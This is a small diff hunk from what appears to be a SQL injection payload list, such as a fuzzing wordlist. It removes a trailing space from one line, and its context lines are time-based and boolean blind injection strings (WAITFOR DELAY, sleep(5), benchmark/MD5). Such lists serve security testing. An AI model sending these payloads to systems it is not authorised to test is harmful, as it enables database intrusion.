@@ -7,7 +7,7 @@
 benchmark(10000000,MD5(1))#
 1' OR NOT 2470=2470-- Ontu
 ' WAITFOR DELAY '0:0:5'--
-';WAITFOR DELAY '0:0:5'-- 
+';WAITFOR DELAY '0:0:5'--
 ')) or sleep(5)='
 ;waitfor delay '0:0:5'--
 );waitfor delay '0:0:5'--
